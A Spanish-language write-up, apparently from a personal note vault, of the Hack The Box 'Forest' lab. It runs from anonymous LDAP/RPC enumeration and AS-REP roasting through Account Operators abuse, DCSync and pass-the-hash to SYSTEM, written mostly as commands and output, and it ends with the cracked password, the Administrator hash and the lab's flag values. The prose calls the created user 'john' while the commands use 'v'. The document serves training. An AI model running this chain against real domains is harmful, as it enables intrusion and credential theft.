---
tags:
  - type/writeup
  - asset/active-directory
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/212
dificultad: Media
ip: 10.10.10.161
os: Windows
relacionados:
  - "[[RPC Enumeration]]"
  - "[[AS-RepRoast attack]]"
  - "[[BloodHound Enumeration]]"
  - "[[Abusing Account Operators Group - Creating a new user]]"
  - "[[Abusing Account Operators Group - Assigning a group to the newly created user]]"
  - "[[Abusing WriteDacl in the domain - Granting DCSync Privileges]]"
  - "[[DCSync Exploitation - Secretsdump.py]]"
  - "[[PassTheHash]]"
---
# HackTheBox - Forest

## Reconocimiento

Mi fase inicial de reconocimiento comenzó con un escaneo exhaustivo de puertos utilizando **Nmap**. Primero, realicé un escaneo rápido para identificar todos los puertos abiertos y, posteriormente, uno más detallado sobre esos puertos para obtener información sobre los servicios y sus versiones.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49929 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados revelaron que la máquina es un **Controlador de Dominio** para el dominio `htb.local`. Los puertos clave abiertos eran:
- **53 (DNS)**
- **88 (Kerberos)**
- **139/445 (SMB)**
- **389/3268 (LDAP)**
- **5985 (WinRM)**
    
Inmediatamente, añadí la entrada `10.10.10.161 htb.local` a mi archivo `/etc/hosts` para facilitar la interacción con el dominio.
```Bash
echo "10.10.10.161 htb.local" | sudo tee -a /etc/hosts
```

### Opcion 1) Enumeración con `LDAP`

Dado que el puerto 389 (LDAP) estaba abierto, mi siguiente paso fue verificar si permitía **"anonymous binds"** (conexiones anónimas), lo cual permitiría consultar la base de datos de Active Directory sin necesidad de credenciales. Utilicé la herramienta `ldapsearch`.
```Bash
ldapsearch -x -H ldap://10.10.10.161:389 -b "dc=htb,dc=local"
```
- `-x`: Especifica una autenticación anónima.
- `-H`: Define la URI del servidor LDAP.
- `-b`: Indica la base de búsqueda (`baseDN`), en este caso, la raíz del dominio.
    
La consulta fue exitosa, devolviendo información sobre el dominio.

> [!note] Permiso de Consulta Anónima en LDAP
> 
> La capacidad de realizar consultas a LDAP sin autenticación es una mala configuración de seguridad. Me permite enumerar usuarios, grupos, políticas y la estructura general del dominio, proporcionando información crucial para planificar un ataque.

Para automatizar y optimizar esta enumeración, utilicé `windapsearch.py`. Primero, listé todos los usuarios del dominio.
```Bash
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
```

La salida mostró varios usuarios estándar y algunas cuentas relacionadas con **Microsoft Exchange**, confirmando su instalación en el dominio. Para obtener una vista completa, realicé una búsqueda más amplia de todos los objetos (`objectClass=*`).
```Bash
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"
```

Entre los más de 300 objetos encontrados, uno llamó mi atención: una cuenta de servicio llamada **`svc-alfresco`**. Una búsqueda rápida sobre "Alfresco" y Kerberos me llevó a documentación que indica que este servicio a menudo requiere que la **pre-autenticación de Kerberos esté desactivada**.

### Opción 2)  Enumeración con `rpcclient`

Me conecté directamente sin proporcionar un usuario: 
```bash
rpcclient -U "" 10.10.10.161 -N
```

Dentro usé:
```bash
enumdomusers
```
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Para facilitar la lista de usuarios ejecuté el mismo comando desde afuera del login y lo guardé en un nuevo archivo: 
```bash
rpcclient -U "" 10.10.10.161 -N -c enumdomusers > usuarios
```

Luego con el uso de expresiones regulares dejé sólo la lista de los usuarios: 
```bash
cat usuarios | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' | sponge usuarios
```

#### Búsqueda de hashes con `GetNPUsers`

Usando `GetNPUsers` sin login encuentro el hash de `svc-alfresco`:
```bash
impacket-GetNPUsers htb.local/ -no-pass -usersfile usuarios
```


---

## Explotación de vulnerabilidades

### AS-REP Roasting

Una cuenta de usuario con la pre-autenticación de Kerberos desactivada (`DONT_REQ_PREAUTH` activado) es vulnerable a un ataque conocido como **AS-REP Roasting**. Este ataque me permite solicitar un TGT (Ticket Granting Ticket) para el usuario sin proporcionar ninguna credencial. El TGT contiene una porción de datos cifrada con el hash NTLM de la contraseña del usuario, la cual puedo intentar crackear offline.

Utilicé el script `GetNPUsers.py` de Impacket para solicitar el TGT y extraer el hash correspondiente.
```Bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
```

El script me devolvió el hash del TGT para `svc-alfresco`:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:fef58ddc72bde86138c79baa53e3f340$[...]
```

Guardé el hash en un archivo y usé **JohnTheRipper** con el diccionario `rockyou.txt` para crackearlo.
```Bash
john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
```
```
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```
> [!SUCCESS] Contraseña Obtenida
> 
> La contraseña para la cuenta svc-alfresco fue crackeada exitosamente: s3rvice.

### Acceso Inicial con Evil-WinRM

Con las credenciales `svc-alfresco:s3rvice` en mi poder y sabiendo que el puerto 5985 (WinRM) estaba abierto, me conecté a la máquina utilizando **Evil-WinRM**.
```Bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

Logré establecer una sesión remota de PowerShell y obtuve la bandera de usuario ubicada en el escritorio de `svc-alfresco`.
```PowerShell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type ..\Desktop\user.txt
```


---

## Escalada de privilegios

### Enumeración Interna con BloodHound

Una vez dentro, mi objetivo era entender la estructura del dominio y encontrar rutas de escalada de privilegios. Para ello, utilicé **BloodHound**. Subí el colector de datos `SharpHound.exe` a la máquina víctima.
```PowerShell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe
```

Ejecuté `SharpHound.exe` para recolectar toda la información posible sobre el dominio y sus relaciones de confianza.
```PowerShell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe -c All
```

Esto generó un archivo `.zip` que descargué a mi máquina para analizarlo con la interfaz de BloodHound.
```PowerShell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20250611080409_BloodHound.zip
```

Tras importar los datos, marqué al usuario `svc-alfresco` como comprometido. El análisis reveló que, a través de membresías anidadas, `svc-alfresco` pertenecía al grupo **Account Operators**.

> [!info] El Poder de 'Account Operators'
> 
> Los miembros del grupo Account Operators tienen permisos para crear y modificar cuentas de usuario y grupo en el dominio. Crucialmente, pueden añadir usuarios a cualquier grupo que no esté protegido por el sistema (como Domain Admins), lo cual representa una vía de escalada de privilegios muy potente.

Además, la herramienta de "Shortest Paths to High Value Targets" de BloodHound me mostró una ruta interesante: el grupo `Exchange Windows Permissions` tenía privilegios **`WriteDacl`** sobre el objeto del dominio `htb.local`. Esto significa que un miembro de este grupo puede modificar la Lista de Control de Acceso (ACL) del dominio y otorgarse a sí mismo (o a otros) privilegios muy elevados, como los de **DCSync**.

>[!BUG] Maquina Modificada con Errores
> La nueva versión de la maquina no muestra esta resolución, sino que muestra un camino de `psremote` que no funciona, no he logrado encontrar como hacerla sin usar el writeup de otro ya que no pude detectar de ninguna forma el `WriteDacl.`

### Abuso de Privilegios de 'Account Operators'

Aprovechando los privilegios de `Account Operators` del usuario `svc-alfresco`, procedí a crear un nuevo usuario, `john`, y lo añadí a los grupos `Exchange Windows Permissions` (para abusar de `WriteDacl`) y `Remote Management Users` (para asegurar el acceso remoto si fuera necesario).
```PowerShell
net user v abc123! /add /domain
net group "Exchange Windows Permissions" v /add /domain
net localgroup "Remote Management Users" v /add
```

### Ataque DCSync

Con mi nuevo usuario `v` dentro del grupo `Exchange Windows Permissions`, el siguiente paso era otorgarle los permisos de **DCSync**. Este privilegio permite a una cuenta replicar los datos del directorio, incluyendo los hashes de las contraseñas de todos los usuarios.

Subí el script `PowerView.ps1` para manipular los ACLs de Active Directory.
```PowerShell
upload PowerView.ps1
. .\PowerView.ps1
```

Luego, utilizando las credenciales de `john`, ejecuté el cmdlet `Add-ObjectACL` para añadir los derechos de `DCSync` al propio `john`.
```PowerShell
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb.local\v', $pass)
Add-ObjectACL -PrincipalIdentity v -Credential $cred -Rights DCSync
```

Ahora que `john` tenía los permisos necesarios, ejecuté `secretsdump.py` desde mi máquina para realizar el ataque DCSync y obtener los hashes NTLM de todos los usuarios del dominio, incluido el del **Administrador**.
```Bash
impacket-secretsdump htb.local/v@10.10.10.161 -password 'abc123!'
```

La herramienta me devolvió el hash del Administrador:
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Pass-the-Hash y Acceso Final

Con el hash NTLM del Administrador, ya no necesitaba su contraseña en texto plano. Utilicé la técnica **Pass-the-Hash (PtH)** con `psexec.py` para autenticarme como Administrador y obtener una shell con privilegios de `SYSTEM`.
```Bash
impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

> [!CAUTION] ¡Acceso Total!
> 
> Microsoft Windows [Version 10.0.14393]
> 
> (c) 2016 Microsoft Corporation. All rights reserved.
> 
> C:\Windows\system32>

Una vez en la shell como `nt authority\system`, pude leer la bandera de root y completar el compromiso total de la máquina.


___

## Bandera(s)

> [!flag] `flag{user}`
> 38b4e0f0556a072680f2c3de1c71014f
^bandera-user

> [!flag] `flag{root}`
> 1dba8b9e720e9194a5f4f3f82f39304f
^bandera-root
